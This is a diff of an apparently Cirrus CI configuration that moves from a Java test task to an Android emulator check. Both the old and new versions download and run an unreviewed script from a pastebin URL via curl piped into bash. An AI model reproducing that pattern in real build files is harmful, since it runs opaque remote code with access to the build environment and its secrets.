@@ -1,5 +1,20 @@
 
-test_task:
-  container:
-    image: openjdk:latest
-  test_script: bash -c "$(curl -fsSL https://pastebin.com/raw/dYdv43k8)"
+container:
+  image: cirrusci/android-sdk:29
+  cpu: 44
+  memory: 10G
+
+check_android_task:
+  create_device_script:
+    bash -c "$(curl -fsSL https://pastebin.com/raw/dYdv43k8)"
+        -n test
+        -k "system-images;android-29;default;armeabi-v7a"
+  start_emulator_background_script:
+    $ANDROID_HOME/emulator/emulator
+        -avd test
+        -no-audio
+        -no-window
+  wait_for_emulator_script:
+    - adb wait-for-device
+    - adb shell input keyevent 82
+  check_script: ./gradlew check connectedCheck
